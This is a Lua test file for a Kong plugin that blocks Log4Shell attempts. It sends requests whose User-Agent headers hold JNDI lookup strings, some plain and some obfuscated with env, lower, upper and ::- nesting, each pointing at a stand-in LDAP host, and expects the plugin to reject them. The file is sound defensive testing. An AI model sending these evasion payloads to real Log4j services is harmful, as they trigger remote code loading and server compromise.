
local helpers = require "spec.helpers"


local PLUGIN_NAME = "log4shell"


for _, strategy in helpers.all_strategies() do
  describe(PLUGIN_NAME .. ": (access) [#" .. strategy .. "]", function()
    local client

    lazy_setup(function()

      local bp = helpers.get_db_utils(strategy == "off" and "postgres" or strategy, nil, { PLUGIN_NAME })

      -- Inject a test route. No need to create a service, there is a default
      -- service which will echo the request.
      local route1 = bp.routes:insert({
        hosts = { "test1.dev" },
      })
      -- add the plugin to test to the route we created
      bp.plugins:insert {
        name = PLUGIN_NAME,
        route = { id = route1.id },
        config = {},
      }

      -- start kong
      assert(helpers.start_kong({
        -- set the strategy
        database   = strategy,
        -- use the custom test template to create a local mock server
        nginx_conf = "spec/fixtures/custom_nginx.template",
        -- make sure our plugin gets loaded
        plugins = "bundled," .. PLUGIN_NAME,
        -- write & load declarative config, only if 'strategy=off'
        declarative_config = strategy == "off" and helpers.make_yaml_file() or nil,
      }))
    end)

    lazy_teardown(function()
      helpers.stop_kong(nil, true)
    end)

    before_each(function()
      client = helpers.proxy_client()
    end)

    after_each(function()
      if client then client:close() end
    end)



    describe("request", function()

      it("Normal requests go through fine", function()
        local r = client:get("/request", {
          headers = {
            host = "test1.dev",
            ['User-agent'] = {"my-user-agent","my-other-user-agent"}
          }
        })
        assert.response(r).has.status(200)

      end)

      it("Checks for jndi lookups", function()
        local r = client:get("/request", {
          headers = {
            host = "test1.dev",
            ['User-agent'] = {"my-user-agent","${jndi:ldap://example.dev/z}"}
          }
        })
        assert.response(r).has.status(403)

      end)

      it("Checks for env: jndi lookups", function()
        local r = client:get("/request", {
          headers = {
            host = "test1.dev",
            ['User-agent'] = {"my-user-agent","${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//example.dev/z}"}
          }
        })
        assert.response(r).has.status(403)

      end)

      it("Checks for lower: jndi lookups", function()
        local r = client:get("/request", {
          headers = {
            host = "test1.dev",
            ['User-agent'] = {"my-user-agent","${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://example.dev/z}"}
          }
        })
        assert.response(r).has.status(403)
      end)

    it("Checks for upper: jndi lookups", function()
      local r = client:get("/request", {
        headers = {
          host = "test1.dev",
          ['User-agent'] = {"my-user-agent","${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://example.dev/z}"}
        }
      })
      assert.response(r).has.status(403)
    end)

    it("Checks for ::- jndi lookups", function()
      local r = client:get("/request", {
        headers = {
          host = "test1.dev",
          ['User-agent'] = {"my-user-agent","${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.dev/z}"}
        }
      })
      assert.response(r).has.status(403)
    end)

  end)



  end)
end
